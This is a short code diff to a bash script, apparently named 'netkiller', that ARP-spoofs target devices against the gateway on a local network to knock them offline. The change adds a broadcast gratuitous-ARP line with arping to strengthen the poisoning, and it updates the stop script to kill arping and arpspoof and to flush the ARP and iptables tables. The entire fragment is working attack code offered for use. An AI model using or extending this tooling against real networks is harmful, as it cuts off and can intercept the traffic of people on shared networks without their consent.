@@ -167,6 +167,7 @@ for TARGET in "${TARGETS[@]}"; do
        (
         sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+        sudo arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        ) &
 done
 
@@ -178,9 +179,10 @@ cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 echo "Unblocking the Device..."
     # Flush arp tables
-    sudo ip -s -s neigh flush all >/dev/null
+    sudo ip -s -s neigh flush all
     # Kill all arpspoof processes
-    sudo pkill arpspoof
+    sudo pkill -f arping
+    sudo pkill -f arpspoof
     # Flush iptables rules
     sudo iptables -F FORWARD
     sudo iptables -t nat -F
